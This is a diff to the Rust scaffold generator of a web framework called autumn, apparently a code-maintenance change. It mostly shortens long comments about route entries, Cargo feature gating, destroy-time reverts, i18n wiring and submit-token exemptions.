-        // this run emits is decided by `trash_enabled` alone, and the prune below handles a
-        // re-run that dropped the flag.
         trash_enabled || for_revert,
-        // Same double-gate reasoning as `trash_enabled || for_revert` above:
-        // the DESTROY/revert path may not repeat the DSL token that turned
-        // `reorder_enabled` on, but a stale routes module still needs its
-        // mounted handlers claimed for cleanup.
         reorder_enabled || for_revert,
         &validated_field_names,
         &sm_field_names,
         &rich_text_field_names,
-        // On the destroy path `--belongs-to` may not have been repeated on the command
-        // line, so `nesting` is `None` — but `main.rs` still mounts the two nested
-        // handlers this resource emitted, and a revert that removed the child's routes
-        // module while leaving those entries behind would leave the project uncompilable.
-        // The markers on disk are the same evidence the parent-side cleanup keys off.
-        //
-        // Gated to `for_revert` deliberately: on the generate path the routes module is
-        // being rewritten right now, and what it emits is decided by `nesting` alone.
-        // Letting stale marker evidence mount handlers the fresh module does not emit is
-        // exactly the uncompilable state this predicate exists to avoid — `nesting`
-        // already folds in the marker inference for a regeneration that omitted the flag.
+        // On revert, the on-disk markers claim the nested entries when `--belongs-to` was not
+        // repeated. Only on revert: on generate, `nesting` already folds in the markers, and
+        // stale markers must not mount handlers the fresh module does not emit.
         nesting.is_some() || (for_revert && !nested_parents.is_empty()),
     );
     let mut mods = vec!["models", "schema", "repositories"];
@@ -1998,15 +1602,9 @@ fn plan_scaffold_with_options_impl(
         mods.push("policies");
     }
     let updated = update_main_rs(&main_existing, &mods, &route_entries);
-    // `update_main_rs` only ADDS entries, so a re-run that stops emitting a
-    // handler leaves the old entry behind pointing at a function the fresh
-    // routes module no longer defines — and the project stops compiling. That
-    // bites hardest on the trash surface: `--soft-delete` is exactly the kind of
-    // flag someone forgets to repeat on a `--force` regeneration, and forgetting
-    // it strands THREE entries at once. So when this render emits no trash
-    // surface, prune any that a previous run mounted. Harmless when there are
-    // none (`remove_routes_entries` returns the input untouched), and never
-    // reached when the surface IS emitted, where the entries are re-added above.
+    // `update_main_rs` only adds entries. A `--force` re-run without `--soft-delete` would
+    // leave the trash entries mounting handlers the fresh routes module no longer defines,
+    // and the project would not compile, so prune them.
     let updated = if trash_enabled {
         updated
     } else {
@@ -2019,14 +1617,8 @@ fn plan_scaffold_with_options_impl(
             ],
         )
     };
-    // Issue #1393: the same for the CSV import pair, and for the same reason —
-    // `--import` is a flag someone forgets to repeat on a `--force`
-    // regeneration, and the variant gates can also turn it off without the flag
-    // changing at all (adding `--sharded`, or adding an `#[encrypted]` column,
-    // is enough). Either way the fresh routes module stops defining the two
-    // handlers while `main.rs` keeps mounting them, and the project stops
-    // compiling. Not reached when the surface IS emitted: the entries are
-    // re-added above.
+    // Issue #1393: the same for the CSV import pair. Besides a dropped `--import`, the
+    // variant gates (`--sharded`, an `#[encrypted]` column) can turn the surface off.
     let updated = if import_enabled {
         updated
     } else {
@@ -2038,8 +1630,7 @@ fn plan_scaffold_with_options_impl(
             ],
         )
     };
-    // Fold the policy/scope registration into the same `updated` content
-    // (issue #1125) so main.rs gets a single `Modify` action.
+    // Folded into `updated` so main.rs gets a single `Modify` action (issue #1125).
     let updated = if policy_on {
         super::schema_edit::add_policy_registration_to_app(
             &updated,
@@ -2050,19 +1641,13 @@ fn plan_scaffold_with_options_impl(
     } else {
         updated
     };
-    // Issue #1349: `.i18n_auto()` in the builder chain is what makes the
-    // generated `t!` lookups resolve to real translations instead of echoing
-    // their keys — AC4's "zero further config". Folded into the same `Modify`
-    // action as everything else main.rs gains. Idempotent, and a no-op for a
-    // project that already installs a bundle its own way (`.i18n(...)`).
+    // Issue #1349: without `.i18n_auto()` the generated `t!` lookups echo their keys.
+    // Idempotent, and a no-op when the project installs its own bundle with `.i18n(...)`.
     //
-    // No matching `Revert`: this is project-level wiring shared by every
-    // `--i18n` resource, and removing it while a sibling still emits `t!` calls
-    // would leave that resource rendering raw keys. Leaving it is inert.
+    // No matching `Revert`: every `--i18n` resource shares this wiring, and removing it
+    // while a sibling still calls `t!` would leave that sibling rendering raw keys.
     let updated = if options_with_key.i18n && !options_with_key.api {
-        // Recomputed rather than threaded down from the bundle-writing block
-        // above: it is one small read, and it keeps this warning's wording
-        // honest about the path the keys actually went to.
+        // Re-read so the warnings name the path the keys were actually written to.
         let (locale, dir) =
             scaffold_i18n::configured_i18n(&read_or_empty(&project_root.join("autumn.toml")));
         let i18n_dir_for_embed = dir.unwrap_or_else(|| "i18n".to_owned());
@@ -2071,21 +1656,10 @@ fn plan_scaffold_with_options_impl(
             locale.unwrap_or_else(|| "en".to_owned())
         );
         match scaffold_i18n::ensure_i18n_auto(&updated) {
-            // Also embed the bundle for `--embed` builds, matching what
-            // `autumn new --with-i18n` wires up. Absent anchors (an `--api` or
-            // hand-rolled `main.rs`) just leave it alone: `.i18n_auto()`'s disk
-            // load still works for an ordinary build.
+            // Also embed the bundle for `--embed` builds, as `autumn new --with-i18n` does.
             scaffold_i18n::I18nAutoWiring::Wired(wired) => {
                 scaffold_i18n::ensure_embedded_locales(&wired, &i18n_dir_for_embed).unwrap_or_else(
                     || {
-                        // The builder chain was found and wired, but the
-                        // template's `EMBEDDED_STATIC` anchors are not there to
-                        // hang the locale embedding on. Filesystem loading still
-                        // works for an ordinary build, so this is not a refusal
-                        // — but it is not silent either: `autumn build --embed`
-                        // advertises a self-contained binary, and this one would
-                        // carry no bundle and panic wherever the sidecar
-                        // directory is absent.
                         plan.warn(format!(
                             "`main.rs` has no `embed_static!`/`embedded_static` anchors, so the                              `{i18n_dir_for_embed}/` bundle was NOT embedded — `.i18n_auto()`                              loads it from disk instead. That is fine for an ordinary build; an                              `autumn build --embed` binary, though, will carry no locales and                              PANICS at startup wherever `{i18n_dir_for_embed}/` is missing. Add                              `embed_locales!` and `.embedded_locales(&…)` by hand if you ship                              `--embed` builds."
                         ));
@@ -2093,14 +1667,8 @@ fn plan_scaffold_with_options_impl(
                     },
                 )
             }
-            // No real `.routes(` call to anchor on. Writing the call anywhere
-            // else risks landing it in a comment, where it would silently never
-            // run and the app would render raw keys forever — so say so instead
-            // and leave `main.rs` alone.
-            // The app installs its own bundle. Leave it be — swapping somebody's
-            // embedded or TMS-backed `Bundle` for a filesystem load would be a
-            // far bigger change than this generator is entitled to make — but
-            // say so, because the keys just written to disk will not reach it.
+            // Replacing the app's own (embedded or TMS-backed) bundle with a disk load is too
+            // big a change for a generator, so only warn.
             scaffold_i18n::I18nAutoWiring::CustomBundle => {
                 plan.warn(format!(
                     "src/main.rs installs its own translation bundle with `.i18n(...)`, which \
@@ -2110,6 +1678,8 @@ fn plan_scaffold_with_options_impl(
                 ));
                 updated
             }
+            // Inserting the call anywhere else could land it inside a comment, where it never
+            // runs, so leave `main.rs` alone and warn.
             scaffold_i18n::I18nAutoWiring::NoAnchor => {
                 plan.warn(
                     "src/main.rs has no `.routes(...)` call to anchor on, so `.i18n_auto()` was \
@@ -2124,11 +1694,8 @@ fn plan_scaffold_with_options_impl(
         updated
     };
     plan.modify(main_path.clone(), updated);
-    // `mod models;`/`mod schema;`/`mod repositories;`/`mod routes;`/`mod policies;`
-    // are shared infrastructure declarations, not owned by this resource — see
-    // `emit::sync_main_rs_mod_declarations`, which removes one only once its
-    // backing module no longer exists on disk. Only this resource's own
-    // `routes![]` entries and policy registration are reverted here.
+    // The `mod` declarations are shared, so they are not reverted here:
+    // `emit::sync_main_rs_mod_declarations` removes one once its module is gone from disk.
     plan.push_revert(Revert::RoutesEntries {
         path: main_path.clone(),
         entries: route_entries,
@@ -2141,32 +1708,23 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // The Maud `html!` macro pulls in a direct `maud` dep on top of the
-    // model's deps. Both modify actions target Cargo.toml, so we combine
-    // them into a single deduplicated call — otherwise the second write
-    // would clobber the first (each rendering is computed at plan time
-    // against the on-disk Cargo.toml).
+    // Each Cargo.toml edit is rendered against the on-disk file, so a second one would
+    // clobber the model's. Drop the staged edits and plan the combined deps in one call.
     plan.actions.retain(|a| !a.path().ends_with("Cargo.toml"));
     let mut combined: Vec<(&str, &str)> = super::model::model_deps(backend)
         .iter()
         .copied()
         .chain(SCAFFOLD_EXTRA_DEPS.iter().copied())
         .collect();
-    // `validator` is needed whenever a routes file is emitted (issue #1124: the
-    // generated `{Pascal}Form` always derives `validator::Validate`), and also
-    // whenever the model itself carries `#[validate]` rules.
+    // The generated `{Pascal}Form` always derives `validator::Validate` (issue #1124).
     if !options_with_key.api || metadata.has_validator_rules() {
         combined.push((
             "validator",
             "{ version = \"0.21\", features = [\"derive\"] }",
         ));
     }
-    // Not re-checked for missing features here: `plan` above *is* the
-    // `plan_model_with_options` plan (reused, not merged), and that call
-    // already ran `warn_if_existing_dep_missing_features` for `rust_decimal`
-    // when it built its own decimal-conditional dep — re-running the same
-    // check against the same (still on-disk, pre-`execute()`) Cargo.toml
-    // here would just duplicate the warning.
+    // No missing-feature check here: `plan_model_with_options` already warned for
+    // `rust_decimal` against the same Cargo.toml.
     if fields.iter().any(|f| f.kind.is_decimal()) {
         combined.push((
             "rust_decimal",
@@ -2185,9 +1743,7 @@ fn plan_scaffold_with_options_impl(
         &project_root.join("src/models"),
     );
 
-    // Re-applied here, not inherited: the `retain` above dropped every staged
-    // `Cargo.toml` action, including the `sqlite` feature `plan_model` added
-    // (issue #1924) — the same reason `maud` and `i18n` are re-applied below.
+    // The `retain` above dropped the `sqlite` feature `plan_model` added (issue #1924).
     if backend == DatabaseBackend::Sqlite {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2212,9 +1768,7 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // The generated HTML routes render through `autumn_web::form::*` helpers
-    // (issue #1124), which are gated behind autumn-web's `maud` feature — enable
-    // it whenever a routes file is emitted.
+    // The HTML routes render through `autumn_web::form::*`, gated on `maud` (issue #1124).
     if !options_with_key.api {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2231,10 +1785,8 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // Pushed unconditionally — see `plan_cargo_deps`'s matching comment:
-        // at `destroy` time this same call recomputes the plan against the
-        // already-generated Cargo.toml, where "maud" is by definition
-        // already present, so `updated != base` above would never be true.
+        // Pushed unconditionally: at `destroy` time the plan is recomputed against the
+        // generated Cargo.toml, where "maud" is already present, so `updated == base`.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: "maud".to_owned(),
@@ -2242,14 +1794,9 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // #1349: the generated views' `t!(locale, …)` lookups and the `Locale` extractor they
-    // read live behind autumn-web's `i18n` feature, and the `.i18n_auto()` call folded
-    // into `main.rs` above is gated on it too. Without this the generated app would not
-    // compile. Deliberately no matching `Revert`, unlike `maud`/`csv`/`htmx`: that
-    // `.i18n_auto()` call is project-level wiring this generator does not take back out,
-    // since a sibling `--i18n` resource would stop resolving its keys, so removing the
-    // feature under it would break the build. Leaving a feature enabled is inert; removing
-    // one that is still called is not.
+    // #1349: `t!`, the `Locale` extractor and `.i18n_auto()` are gated on `i18n`. No
+    // `Revert`: the `.i18n_auto()` call above is never taken back out, so removing the
+    // feature under it would break the build.
     if options_with_key.i18n && !options_with_key.api {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2268,12 +1815,8 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // Issue #1315: the emitted `CsvSchema` impl and `export.csv` handler call
-    // into `autumn_web::data::csv`, which is gated behind autumn-web's `csv`
-    // feature (off by default so the `csv` crate stays out of apps that don't
-    // export). Without this the generated app would not compile. Enabled only
-    // where the export is actually emitted, so a `--api`/`--live`/`--sharded`
-    // scaffold's Cargo.toml is untouched.
+    // Issue #1315: the `CsvSchema` impl and `export.csv` handler need the off-by-default
+    // `csv` feature.
     if export_enabled {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2290,14 +1833,9 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // Pushed unconditionally — see the `maud` block above for why. `owner_dir: None`,
-        // unlike `maud`'s `src/routes`, because "some routes file still exists" is the
-        // wrong question for `csv`: only an export-enabled resource needs the feature, so
-        // a surviving `--live` or `--sharded` routes module would pin it forever. The
-        // `autumn_web::data::csv::` marker registered in `emit::autumn_web_feature_markers`
-        // is the precise test — it matches another scaffold's emitted `CsvSchema` impl and
-        // any hand-written `import_csv`/`export_csv` code, and matches neither when the
-        // resource being destroyed was the only user.
+        // Pushed unconditionally, as for `maud`. `owner_dir: None`: a surviving `--live` or
+        // `--sharded` routes module does not use `csv`, so the `autumn_web::data::csv::`
+        // marker in `emit::autumn_web_feature_markers` decides instead.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: "csv".to_owned(),
@@ -2305,20 +1843,12 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // #1393: the emitted import handler takes an `autumn_web::extract::Multipart` body,
-    // which is gated behind autumn-web's `multipart` feature — off by default so
-    // `axum/multipart` and the `infer` sniffer stay out of apps that never take an upload.
-    // The `csv` feature the handler also needs is already enabled by the export block
-    // above, since the import is gated on that export existing, so only `multipart` is
-    // added here. Without it the generated app would not compile.
+    // #1393: the import handler takes a `Multipart` body, gated on the off-by-default
+    // `multipart` feature. Its `csv` need is covered above: import requires export.
     //
-    // Claimed on the destroy path too, whether or not `--import` was repeated there, for
-    // the same reason `main_route_entries` claims the two route entries unconditionally: a
-    // revert that removed the routes module but left the feature pinned would leave the
-    // project carrying a dependency nothing uses. The revert is a no-op when the feature is
-    // absent, so claiming it is always safe. Unlike `csv` above, this gate turns on a flag
-    // the author must repeat: `export_enabled` is derived from the model's shape and
-    // survives a bare `destroy scaffold`, while `--import` does not.
+    // Claimed on destroy even when `--import` is not repeated: unlike `export_enabled`,
+    // which follows the model's shape, the flag does not survive a bare `destroy scaffold`.
+    // The revert is a no-op when the feature is absent.
     if import_enabled || for_revert {
         let cargo_path = project_root.join("Cargo.toml");
         if import_enabled {
@@ -2339,15 +1869,8 @@ fn plan_scaffold_with_options_impl(
                 plan.modify(cargo_path.clone(), updated);
             }
         }
-        // `owner_dir: None` for the same reason the `csv` feature above uses it:
-        // "some routes file still exists" is the wrong question, since only an
-        // IMPORT-enabled resource (or an attachment scaffold, which enables the
-        // same feature) needs `multipart`. The bare `Multipart` marker
-        // registered in `emit::autumn_web_feature_markers` is the precise test —
-        // it matches another scaffold's import or attachment handler AND any
-        // hand-written multipart code (including one that names the type through
-        // the prelude), and matches none of them when the resource being
-        // destroyed was the only user.
+        // `owner_dir: None`, as for `csv`: the `Multipart` marker in
+        // `emit::autumn_web_feature_markers` decides.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: "multipart".to_owned(),
@@ -2355,10 +1878,8 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // Issue #1319: a searchable (non-live) index inlines an htmx `<script>` and
-    // its results handler extracts `HxRequest`, both gated behind autumn-web's
-    // `htmx` feature — enable it. (Live variants enable `htmx` in the block
-    // below; api scaffolds have no HTML index, so no search box.)
+    // Issue #1319: a searchable index inlines an htmx `<script>` and its results handler
+    // extracts `HxRequest`, both gated on `htmx`.
     if search_enabled && !options_with_key.api {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2382,11 +1903,9 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // Issue #3408: the widgets the HTML routes render are in feature-gated
-    // families. The index wraps its list in `bulk_actions_form` and a
-    // state-machine field renders `transition_controls` (`widgets-workflow`).
-    // A searchable index renders `active_search_input` (`widgets-search`). A
-    // project with `default-features = false` needs each family named.
+    // Issue #3408: a project with `default-features = false` needs each widget family the
+    // routes render: `bulk_actions_form` and `transition_controls` (`widgets-workflow`),
+    // `active_search_input` (`widgets-search`).
     let workflow_widgets = bulk_delete_enabled || !sm_field_names.is_empty();
     let search_widgets = search_enabled && !options_with_key.api;
     for (feature, needed) in [
@@ -2411,9 +1930,7 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // `owner_dir: None`: the markers in `emit::autumn_web_feature_markers`
-        // decide, so another scaffold or hand-written code that renders the
-        // same family keeps it.
+        // `owner_dir: None`: the markers in `emit::autumn_web_feature_markers` decide.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: feature.to_owned(),
@@ -2421,19 +1938,12 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // #1236: a scaffold with attachment fields needs autumn-web's `storage` feature — the
-    // model's `autumn_web::storage::Blob` column and the blob store — and its `multipart`
-    // feature, since the create and update handlers take an
-    // `autumn_web::extract::Multipart` body and stream files to the store with no
-    // JavaScript. Enable both so a freshly scaffolded resource compiles.
+    // #1236: attachment fields need `storage` (the `Blob` column and blob store) and
+    // `multipart` (the create and update handlers take a `Multipart` body).
     //
-    // The generated handlers also mint each blob key as
-    // `{plural}/{field}/{nanos}_{uuid}`; the `uuid::Uuid::new_v4()` suffix stops two
-    // uploads for the same field colliding on an identical nanosecond timestamp,
-    // including two attachment fields in one multipart request. `MODEL_DEPS` already
-    // declares `uuid`, with only the `serde` feature via `plan_cargo_deps`, so enable its
-    // `v4` feature for that call to resolve. Reverting the whole `uuid` dep at destroy
-    // time is handled by `plan_cargo_deps`'s `CargoDeps` revert.
+    // Blob keys are `{plural}/{field}/{nanos}_{uuid}`; the `Uuid::new_v4()` suffix keeps two
+    // uploads with the same timestamp apart, so `uuid` needs `v4`. `plan_cargo_deps`'s
+    // `CargoDeps` revert removes the whole `uuid` dep at destroy time.
     if has_attachment_fields(&fields) {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2455,10 +1965,7 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // Pushed unconditionally — see `plan_cargo_deps`'s matching comment: at
-        // `destroy` time this same call recomputes the plan against the already-
-        // generated Cargo.toml, where the features are by definition already
-        // present, so `updated != base` above would never be true.
+        // Pushed unconditionally, as for `maud`: at `destroy` time `updated == base`.
         let models_dir = project_root.join("src").join("models");
         for feat in feats {
             plan.push_revert(Revert::CargoAutumnWebFeature {
@@ -2468,13 +1975,9 @@ fn plan_scaffold_with_options_impl(
             });
         }
 
-        // The Cargo features make the scaffold COMPILE; a configured backend is
-        // what makes an upload actually persist. `StorageConfig::backend`
-        // defaults to `Disabled`, so without a `[storage]` block the generated
-        // `create` handler answers 500 "storage not configured" on the very
-        // first submit. We don't write the block ourselves — `autumn.toml` is
-        // the operator's file and the right backend is a deployment decision —
-        // but an author must not have to discover this by hitting the 500.
+        // `StorageConfig::backend` defaults to `Disabled`, so without a `[storage]` block the
+        // first upload answers 500. The backend is the operator's choice, so warn instead of
+        // writing one.
         let autumn_toml = project_root.join("autumn.toml");
         let toml_contents = plan
             .actions
@@ -2497,16 +2000,11 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // #1255: a scaffold with `richtext` columns needs autumn-web's `markdown` feature. The
-    // generated show view, preview route, and form control all call
-    // `autumn_web::markdown::render_user_content`, via `form::rich_text_area_htmx`'s
-    // pre-rendered preview pane, which is gated on that feature; without it the scaffold
-    // would not compile. `--api` renders no form and no show view, so it needs neither the
-    // feature nor the preview route: the column is just TEXT carrying Markdown source out
-    // over JSON, and the client renders it. The show view renders every richtext column,
-    // including a `--default`ed one that the form drops but the detail page still displays,
-    // so the feature gate reads `fields`; the preview routes below are emitted only for
-    // form columns, so their exemption reads `rich_text_field_names`.
+    // #1255: the show view, preview route and form control call
+    // `autumn_web::markdown::render_user_content`, gated on `markdown`. `--api` renders
+    // neither, so it needs no feature. The show view renders every richtext column, including
+    // a `--default`ed one the form drops, so this reads `fields`; the preview routes exist
+    // only for form columns, so their exemption below reads `rich_text_field_names`.
     let rich_text_views = has_rich_text_fields(&fields) && !options_with_key.api;
     if rich_text_views {
         let cargo_path = project_root.join("Cargo.toml");
@@ -2524,9 +2022,7 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // Pushed unconditionally for the same reason as the attachment block
-        // above: at `destroy` time the plan is recomputed against the already-
-        // generated Cargo.toml, where the feature is by definition present.
+        // Pushed unconditionally, as for `maud`.
         plan.push_revert(Revert::CargoAutumnWebFeature {
             path: cargo_path,
             feature: "markdown".to_owned(),
@@ -2572,12 +2068,8 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // The generated smoke test uses `autumn_web::test::TestDb` (a real,
-    // throwaway Postgres testcontainer) to back its in-process `TestApp`
-    // request. `TestDb` is compiled only when the `test-support` feature is
-    // enabled, and that feature must stay out of `[dependencies]` so release
-    // builds don't pull in `testcontainers` — so it goes in
-    // `[dev-dependencies]` instead.
+    // The smoke test uses `autumn_web::test::TestDb`, gated on `test-support`. It goes in
+    // `[dev-dependencies]` so release builds do not pull in `testcontainers`.
     {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2594,10 +2086,8 @@ fn plan_scaffold_with_options_impl(
             plan.actions.retain(|a| a.path() != cargo_path);
             plan.modify(cargo_path.clone(), updated);
         }
-        // Pushed unconditionally — see `plan_cargo_deps`'s matching comment.
-        // `owner_dir` is `src/models` (not `src/routes`) because the smoke
-        // test — and thus `test-support` — is generated for EVERY scaffold,
-        // including `--api`-only ones that never get a routes file.
+        // Pushed unconditionally. `owner_dir` is `src/models`: every scaffold gets the smoke
+        // test, including `--api` ones with no routes file.
         plan.push_revert(Revert::CargoAutumnWebDevFeature {
             path: cargo_path,
             feature: "test-support".to_owned(),
@@ -2605,12 +2095,8 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
-    // The generated smoke test also uses `#[tokio::test]`, which needs the
-    // `rt` and `macros` tokio features to compile. Every `autumn new`
-    // project already has these (see `templates/Cargo.toml.tmpl`), but a
-    // hand-rolled or edited-down Cargo.toml might not -- and `cargo test
-    // --tests` still compiles `#[ignore]`d tests, so a missing dev-dependency
-    // here would leave the project unable to compile its test targets.
+    // `#[tokio::test]` needs tokio's `rt` and `macros`. `autumn new` projects have them, but
+    // a hand-written Cargo.toml may not, and `#[ignore]`d tests still compile.
     {
         let cargo_path = project_root.join("Cargo.toml");
         let base = plan
@@ -2629,22 +2115,13 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // ── autumn.toml: exempt this resource's form-echoing POST routes from the
-    // submit-token guard.
+    // ── autumn.toml: exempt the form-echoing POST routes from the submit-token guard.
     //
-    // Both families `hx-include` the whole form, so without an exemption the one-time
-    // `_submit_token` is consumed by a helper request and the real create or update
-    // submit replays a fragment instead of mutating:
-    //
-    // - `POST /{plural}/validate/{field}` — `--live-validation` inline validation (#1360).
-    // - `POST /{plural}/preview/{field}` — a `richtext` column's live Markdown preview
-    //   (#1255).
-    //
-    // The `hx-params="not _submit_token"` markup filter mitigates this only for the
-    // default field name; exempting the route by prefix makes it robust for any
-    // configured `security.submit_token.field_name`. Applied only when the project has an
-    // `autumn.toml` to edit — a bare project keeps the markup filter as its sole,
-    // still-effective default-field-name guard.
+    // `POST /{plural}/validate/{field}` (#1360) and `POST /{plural}/preview/{field}` (#1255)
+    // `hx-include` the whole form, so a helper request would consume the one-time
+    // `_submit_token` and the real submit would replay instead of mutating. The markup's
+    // `hx-params="not _submit_token"` covers only the default field name; the prefix
+    // exemption covers any `security.submit_token.field_name`.
     let mut exempt_segments: Vec<&str> = Vec::new();
     if options_with_key.live_validation {
         exempt_segments.push("validate");
@@ -2656,8 +2133,7 @@ fn plan_scaffold_with_options_impl(
         let autumn_toml_path = project_root.join("autumn.toml");
         if autumn_toml_path.exists() {
             for segment in exempt_segments {
-                // Re-read the *planned* content each round so a second segment
-                // merges into the first's edit instead of overwriting it.
+                // Re-read the planned content so a second segment merges into the first.
                 let toml_existing = plan
                     .actions
                     .iter()
@@ -2669,12 +2145,8 @@ fn plan_scaffold_with_options_impl(
                         _ => None,
                     })
                     .unwrap_or_else(|| read_or_empty(&autumn_toml_path));
-                // Only record the modify *and* the destroy-time revert when this
-                // scaffold actually inserts the exemption. If the prefix is
-                // already present (a preexisting, user-owned entry), the append
-                // is a no-op and returns `None`; recording a revert then would
-                // let a later `autumn destroy` delete an exemption we never
-                // added, re-enabling submit-token guarding on those routes.
+                // `None` means the user already owns this exemption. Recording a revert then
+                // would let `autumn destroy` delete an entry this scaffold never added.
                 if let Some(updated_toml) =
                     append_submit_token_exempt_to_toml(&toml_existing, &plural, segment)
                 {
@@ -2843,22 +2315,16 @@ fn parse_query_specs(
             });
         }
         if field.is_enum() {
-            // The repository file's `use crate::models::<snake>::{...}` import
-            // only brings in the model + New/Update companions — not a
-            // per-field generated enum type — so a derived-query parameter of
-            // that type wouldn't resolve. Reject rather than emit code that
-            // fails to compile.
+            // The repository file imports only the model and its New/Update companions, so a
+            // parameter of the field's enum type would not resolve.
             return Err(GenerateError::InvalidField {
                 token: query.clone(),
                 reason: format!("`--query` on enum field '{field_name}' is not yet supported"),
             });
         }
-        // Issue #1340 AC6: a derived `find_by_<col>` against a RANDOMIZED
-        // encrypted column compiles fine and then fails at runtime — the
-        // repository macro routes the bound string through the encrypted-column
-        // registry, which raises `EncryptionError::RandomizedEqualityLookup`
-        // because a fresh nonce per write means the needle's ciphertext can
-        // never equal the stored one. Refuse it where the fix is one word away.
+        // Issue #1340: on a randomized encrypted column a fresh nonce per write means an
+        // equality lookup never matches; it compiles, then fails at runtime with
+        // `EncryptionError::RandomizedEqualityLookup`.
         if !for_revert && field.is_randomized_encrypted() {
             return Err(GenerateError::InvalidField {
                 token: query.clone(),
@@ -2880,12 +2346,8 @@ fn parse_query_specs(
             rust_type: field.rust_type_for(backend),
         });
     }
-    // Every `unique` field (issue #1032) gets a `find_by_<field>` repository
-    // lookup for free — no `--query` needed — mirroring how a `references`
-    // field auto-contributes to the migration's index set without an
-    // explicit `--index`. Skipped for a field already covered by an
-    // explicit `--query`, and for `enum` fields (same import-path
-    // limitation `--query` itself rejects above).
+    // Every `unique` field gets a `find_by_<field>` lookup without `--query` (issue #1032).
+    // Enum fields are skipped for the import limitation `--query` rejects above.
     for field in fields {
         if field.unique
             && !field.is_enum()
@@ -3029,43 +2491,24 @@ fn render_repository_file(
     let query_body = render_repository_queries(pascal_name, queries);
     let soft_delete_attr = if soft_delete { ", soft_delete" } else { "" };
     let broadcasts_attr = if live { ", broadcasts = true" } else { "" };
-    // When `broadcasts = true` is set, `#[repository]` synthesizes internal
-    // hooks whose generated `update` body expands an unqualified
-    // `{Pascal}DraftExt::from_patch(...)`. Import that trait alongside the other
-    // model types so the generated repository compiles (issue #1853).
-    //
-    // Warden 2026-09-13: the macro's `_api_update` handler does the same thing
-    // whenever `policy = Type` is present (`has_policy`, issue #1801's
-    // merged-model validation) — and `api = "/api/{plural}"` is unconditional
-    // in this function's template (the `api` bool param below only toggles
-    // the doc comment/fragment content, never whether the attribute carries
-    // `api = ...`), so `has_policy` is live whenever `owner_column.is_some()`
-    // (`owner_policy_wiring` above always wires a `policy = Type` alongside
-    // `owner = <col>`) — on EVERY owner-scoped scaffold, `--api` or not. So
-    // the import is needed whenever EITHER drives `has_policy`: `live`
-    // (broadcasts) or `owner_column.is_some()` (policy). Caught by CI's
-    // `owner-searchable`/`nullable-owner-searchable`/`attachment-owner`/
-    // `policy-scaffold` generator-conformance jobs (E0405: `PostDraftExt` not
-    // found) after an earlier cut of this fix wrongly gated on `api` too.
+    // `#[repository]` expands an unqualified `{Pascal}DraftExt::from_patch(...)` in its
+    // `broadcasts = true` hooks (issue #1853) and, when `policy = ...` is set, in its
+    // `_api_update` handler (issue #1801). The template always carries `api = ...`, and an
+    // owner column always wires a policy, so `live` or an owner column needs the import,
+    // `--api` or not.
     let draft_ext_import = if live || owner_column.is_some() {
         format!(", {pascal_name}DraftExt")
     } else {
         String::new()
     };
-    // Issue #1319: `searchable` opts the repository into the FTS `search()` /
-    // `search_page(query, &PageRequest)` methods (backed by the model's
-    // `#[searchable]` fields + the migration's `search_vector` column).
+    // Issue #1319: `searchable` adds the FTS `search()`/`search_page()` methods, backed by
+    // the migration's `search_vector` column.
     let searchable_attr = if searchable { ", searchable" } else { "" };
-    // Issue #1841 + Warden 2026-09-13 (see `owner_policy_wiring`'s doc comment):
-    // `owner = <col>` + `policy = <Type>` make `#[repository]` emit owner-filtered
-    // `list_scoped`/`search_page_scoped` and gate the auto-API. Only the caller's
-    // in-scope standard Db path passes `Some`; every other scaffold passes `None`.
+    // Issue #1841: `owner = <col>` + `policy = <Type>` make `#[repository]` emit owner-filtered
+    // `list_scoped`/`search_page_scoped` and gate the auto-API.
     let (owner_attr, policy_attr, policy_use) =
         owner_policy_wiring(owner_column, pascal_name, snake_name);
-    // Issue #1358: a `position`/`position{{scope:col}}` DSL field wires
-    // `position(column = "...", scope = "...")` into the generated
-    // `#[repository(...)]` attribute, which is what actually generates the
-    // `move_to`/`move_before`/`move_after`/`move_up`/`move_down` methods —
+    // Issue #1358: the `position(...)` repository attribute generates the `move_*` methods;
     // the DSL field alone only shapes the model struct and migration.
     let position_attr = position.map_or(String::new(), |f| {
         f.constraints.scope.as_deref().map_or_else(
@@ -3118,8 +2561,7 @@ fn render_repository_file(
              {sharded_note}"
         )
     };
-    // For API scaffolds with --live, emit the stream route directly in the
-    // repository file since there is no separate routes file.
+    // An `--api --live` scaffold has no routes file, so the stream route lives here.
     let api_stream_handler = if api && live {
         format!(
             "\n/// `GET /{plural}/stream` — SSE stream for live OOB fragments.\n\
